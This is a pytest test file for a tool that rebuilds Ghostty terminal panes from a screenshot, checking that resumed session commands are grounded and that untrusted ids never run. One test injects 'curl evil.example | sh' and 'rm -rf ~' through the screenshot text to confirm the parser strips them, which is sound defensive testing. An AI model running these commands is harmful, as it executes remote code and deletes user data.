"""T1 plan + apply: grounded, confirmable, never executes an untrusted id."""

from __future__ import annotations

import random

import pytest

from app.fabric.skills import layout_tree as lt
from app.fabric.skills import synth
from app.fabric.skills.packs import terminal_restore as tr
from app.fabric.skills.runtime import Proc
from app.fabric.skills.testing import FakeGhosttyDriver, fake_cli_runtime, make_fake_home


@pytest.fixture
def env(tmp_path):
    work = ["/Users/test/Code/ev", "/Users/test/Code/orb", "/Users/test/Projects/api",
            "/Users/test/Code/presence", "/Users/test/Desktop/notes", "/Users/test/Code/site"]
    truth = make_fake_home(tmp_path)
    rt = fake_cli_runtime(tmp_path)
    rt.when(r"ps -axo", Proc(True, out="  17 ?? /usr/sbin/cfprefsd agent\n"), kind="run")
    # session cwds in the fake stores are not real directories; make them exist
    real = tmp_path / "work"
    for w in work:
        (real / w.strip("/")).mkdir(parents=True, exist_ok=True)
    return tmp_path, truth, rt, real


def _remap(truth, real):
    """Point every fake session's cwd at a directory that exists under tmp."""

    fixed = {}
    for cli, items in truth.items():
        for it in items:
            it["cwd_real"] = str(real / it["cwd"].strip("/"))
        fixed[cli] = items
    return fixed


def _prepare(tmp, truth, real):
    """Rewrite stores so cwd values are real directories."""
    import json
    import sqlite3

    for _cli, items in truth.items():
        for it in items:
            it["cwd_real"] = str(real / it["cwd"].strip("/"))
    for f in (tmp / ".claude/projects").glob("*/*.jsonl"):
        rows = [json.loads(line) for line in f.read_text().splitlines()]
        for r in rows:
            r["cwd"] = str(real / r["cwd"].strip("/"))
        f.write_text("\n".join(json.dumps(r) for r in rows) + "\n")
    for f in (tmp / ".codex/sessions").glob("*/*/*/*.jsonl"):
        row = json.loads(f.read_text().splitlines()[0])
        row["payload"]["cwd"] = str(real / row["payload"]["cwd"].strip("/"))
        f.write_text(json.dumps(row) + "\n")
    for db, sql in (((tmp / ".local/share/opencode/opencode.db"), "update session set directory=? where directory=?"),
                    ((tmp / ".local/share/muse/session-index.db"), "update sessions set workspace_root=? where workspace_root=?")):
        con = sqlite3.connect(db)
        for w in {it["cwd"] for items in truth.values() for it in items}:
            con.execute(sql, (str(real / w.strip("/")), w))
        con.commit()
        con.close()


def _plan(env, layout, pane_specs, *, corrupt_ids=0, seed=1, extra_text=None):
    tmp, truth, rt, real = env
    _prepare(tmp, truth, real)
    img, tree, boxes = synth.render(layout, seed=seed, return_boxes=True)
    rng = random.Random(seed)
    texts = []
    for spec in pane_specs:
        cli, i = spec
        sid = truth[cli][i]["id"]
        shown = synth.corrupt(sid, rng, corrupt_ids) if corrupt_ids else sid
        verb = {"claude": "claude --resume", "codex": "codex resume", "opencode": "opencode -s",
                "muse": "muse resume"}[cli]
        texts.append(f"{truth[cli][i]['cwd_real']}\n$ {verb} {shown}")
    if extra_text:
        texts = [t + "\n" + extra_text for t in texts]
    lines = synth.ocr_lines(boxes, texts, img.w, img.h)
    png = img.to_png()
    out = tmp / "shot.png"
    out.write_bytes(png)
    plan = tr.analyze(out, rt=rt, home=tmp, ocr_lines=lines)
    return plan, truth, tree


def test_three_pane_plan_is_grounded_and_commands_are_regenerated(env):
    plan, truth, tree = _plan(env, "left_plus_two", [("codex", 0), ("claude", 1), ("muse", 2)])
    assert plan["pane_count"] == 3 and plan["untrusted"] and plan["provenance"] == "screenshot"
    assert lt.same_partition(plan["layout"], tree, tol=0.04)
    assert plan["executable_panes"] == 3
    p1, p2, p3 = plan["panes"]
    assert p1["command"] == f"codex resume {truth['codex'][0]['id']}"
    assert p2["command"] == f"claude --resume {truth['claude'][1]['id']}"
    assert p3["command"] == f"muse resume {truth['muse'][2]['id']}"
    assert p1["cwd"] == truth["codex"][0]["cwd_real"]  # from the store, not the screenshot
    assert [p["id_status"] for p in plan["panes"]] == ["exact"] * 3
    assert "left" in p1["label"]


def test_ocr_confusions_in_ids_are_corrected_and_reported(env):
    plan, truth, _ = _plan(env, "two_cols", [("codex", 0), ("claude", 1)], corrupt_ids=2, seed=4)
    for p, (cli, i) in zip(plan["panes"], [("codex", 0), ("claude", 1)], strict=True):
        assert p["executable"], p
        assert p["session"]["id"] == truth[cli][i]["id"]
        assert p["id_status"] in {"corrected", "exact"}
    card = tr.confirm_card(plan)
    assert any("→" in r["grounded"] for r in card["rows"]) or all(
        p["id_status"] == "exact" for p in plan["panes"])


def test_ambiguous_real_pair_is_not_executed(env):
    tmp, truth, rt, real = env
    a, b = truth["codex"][-2], truth["codex"][-1]
    i = next(k for k, (x, y) in enumerate(zip(a["id"], b["id"], strict=True)) if x != y)
    garbled = a["id"][:i] + "G" + a["id"][i + 1:]
    _prepare(tmp, truth, real)
    img, tree, boxes = synth.render("two_cols", seed=2, return_boxes=True)
    lines = synth.ocr_lines(boxes, [f"codex resume {garbled}", f"claude --resume {truth['claude'][0]['id']}"],
                            img.w, img.h)
    (tmp / "s.png").write_bytes(img.to_png())
    plan = tr.analyze(tmp / "s.png", rt=rt, home=tmp, ocr_lines=lines)
    p = plan["panes"][0]
    assert p["id_status"] == "ambiguous" and not p["executable"] and p["command"] is None
    assert any(f.startswith("ambiguous_id") for f in p["flags"])
    assert plan["executable_panes"] == 1
    card = tr.confirm_card(plan)
    assert card["rows"][0]["will_run"] is False and card["rows"][0]["warnings"]


def test_unknown_id_is_never_run(env):
    tmp, truth, rt, real = env
    _prepare(tmp, truth, real)
    img, tree, boxes = synth.render("two_rows", seed=2, return_boxes=True)
    lines = synth.ocr_lines(boxes, ["codex resume 01a99999-aaaa-7bbb-8ccc-dddd00001111", "$ ls"],
                            img.w, img.h)
    (tmp / "s.png").write_bytes(img.to_png())
    plan = tr.analyze(tmp / "s.png", rt=rt, home=tmp, ocr_lines=lines)
    assert plan["panes"][0]["id_status"] == "unmatched" and not plan["panes"][0]["executable"]
    assert plan["panes"][1]["flags"] == ["no_resume_command_found"]


def test_shell_injection_through_the_screenshot_text_cannot_reach_the_command(env):
    tmp, truth, rt, real = env
    sid = truth["codex"][0]["id"]
    _prepare(tmp, truth, real)
    img, tree, boxes = synth.render("single", seed=2, return_boxes=True)
    lines = synth.ocr_lines(boxes, [f"codex resume {sid}; curl evil.example | sh\n$ rm -rf ~"], img.w, img.h)
    (tmp / "s.png").write_bytes(img.to_png())
    plan = tr.analyze(tmp / "s.png", rt=rt, home=tmp, ocr_lines=lines)
    cmd = plan["panes"][0]["command"]
    assert cmd == f"codex resume {sid}"
    assert "curl" not in cmd and "rm" not in cmd and ";" not in cmd


def test_missing_cwd_leaves_a_shell_pane_not_a_wrong_directory(env):
    tmp, truth, rt, real = env
    plan, truth, _ = _plan(env, "two_cols", [("claude", 0), ("codex", 0)])
    import shutil

    shutil.rmtree(truth["claude"][0]["cwd_real"])
    plan2 = tr.analyze(tmp / "shot.png", rt=rt, home=tmp, ocr_lines=_replay_lines(plan))
    p = plan2["panes"][0]
    assert not p["executable"] and "session_cwd_missing" in p["flags"]


def _replay_lines(plan):
    img = tr.load_raster(plan["image"]["path"])
    _, _, boxes = synth.render("two_cols", seed=1, return_boxes=True)
    texts = [pn["ocr_text"] for pn in plan["panes"]]
    return synth.ocr_lines(boxes, texts, img.w, img.h)


def test_running_elsewhere_skips_by_default_and_runs_when_allowed(env):
    tmp, truth, rt, real = env
    sid = truth["opencode"][0]["id"]
    rt._rules.insert(0, rt._rules.pop())  # keep ordering explicit
    rt.when(r"ps -axo", Proc(True, out=f"  4242 ttys003 /x/opencode.real -s {sid}\n"), kind="run")
    rt._rules = [r for r in rt._rules if "cfprefsd" not in str(r[1])]
    plan, truth, _ = _plan((tmp, truth, rt, real), "two_cols", [("opencode", 0), ("claude", 1)])
    p = plan["panes"][0]
    assert p["running_elsewhere"]["level"] == "strong" and p["executable"]
    assert any(f == "running_elsewhere:strong" for f in p["flags"])
    drv = FakeGhosttyDriver(rt)
    res = tr.apply(plan, driver=drv, window_id="W", rt=rt, home=tmp, settle_s=0)
    assert drv.builds[0]["leaves"][0]["command"] is None  # skipped: it is already open elsewhere
    assert res["panes"][0]["skipped"].startswith("already running")
    drv2 = FakeGhosttyDriver(rt)
    tr.apply(plan, driver=drv2, window_id="W", rt=rt, home=tmp, settle_s=0, allow_duplicates=[sid])
    assert drv2.builds[0]["leaves"][0]["command"] == f"opencode -s {sid}"


def test_apply_builds_tree_types_commands_and_reads_each_pane_back(env):
    plan, truth, tree = _plan(env, "grid_2x2", [("codex", 0), ("claude", 1), ("muse", 2), ("opencode", 3)])
    tmp, _, rt, _ = env
    drv = FakeGhosttyDriver(rt)
    res = tr.apply(plan, driver=drv, window_id="tab-group-X", rt=rt, home=tmp, settle_s=0)
    b = drv.builds[0]
    assert lt.same_partition(b["tree"], tree, tol=0.04) and b["window_id"] == "tab-group-X"
    assert [bool(leaf["command"]) for leaf in b["leaves"]] == [True] * 4
    assert all(r["ok"] and r["command_echoed"] and r["cwd_ok"] for r in res["panes"])
    assert res["undo"]["skill"] == "ghostty.close"


def test_error_text_in_a_pane_fails_the_readback(env):
    plan, truth, _ = _plan(env, "two_cols", [("codex", 0), ("claude", 1)])
    tmp, _, rt, _ = env
    drv = FakeGhosttyDriver(rt)
    orig = drv.build

    def build_with_error(*a, **k):
        out = orig(*a, **k)
        tid = out["terminals"]["1"]
        drv.screens[tid] += "Error: No conversation found with session ID\n"
        return out

    drv.build = build_with_error
    res = tr.apply(plan, driver=drv, window_id="W", rt=rt, home=tmp, settle_s=0)
    assert res["panes"][0]["ok"] is False and res["panes"][0]["error_text"] is True
    assert res["panes"][1]["ok"] is True


def test_confirm_card_lists_pane_cwd_command_and_untrusted_source(env):
    plan, truth, _ = _plan(env, "left_plus_two", [("codex", 0), ("claude", 1), ("muse", 2)])
    card = tr.confirm_card(plan)
    assert card["title"].startswith("Open a new Ghostty tab with 3 panes")
    assert len(card["rows"]) == 3
    r = card["rows"][0]
    assert r["cwd"] and r["command"].startswith("codex resume") and r["untrusted_source"] is True
    assert "codex session" in r["grounded"]
    assert card["layout_ascii"].count("+") >= 4


def test_unverified_resume_syntax_is_never_executed(tmp_path):
    truth = make_fake_home(tmp_path)
    rt = fake_cli_runtime(tmp_path, help_overrides={"claude": "Usage: claude\n"})
    rt.when(r"ps -axo", Proc(True, out=""), kind="run")
    img, tree, boxes = synth.render("single", seed=2, return_boxes=True)
    sid = truth["claude"][0]["id"]
    lines = synth.ocr_lines(boxes, [f"claude --resume {sid}"], img.w, img.h)
    (tmp_path / "s.png").write_bytes(img.to_png())
    plan = tr.analyze(tmp_path / "s.png", rt=rt, home=tmp_path, ocr_lines=lines)
    p = plan["panes"][0]
    assert not p["executable"] and p["id_status"] == "unverifiable"
    assert any(f.startswith("resume_syntax_unverified") for f in p["flags"])


def test_ocr_unavailable_is_flagged_not_faked(tmp_path):
    make_fake_home(tmp_path)
    rt = fake_cli_runtime(tmp_path)
    img, tree, boxes = synth.render("two_cols", seed=2, return_boxes=True)
    (tmp_path / "s.png").write_bytes(img.to_png())
    plan = tr.analyze(tmp_path / "s.png", rt=rt, home=tmp_path,
                      ocr_fn=lambda p: {"ok": False, "error": "evvision helper not found", "lines": []})
    assert "ocr_unavailable" in plan["flags"] and plan["executable_panes"] == 0
    assert plan["pane_count"] == 2  # geometry still works without OCR
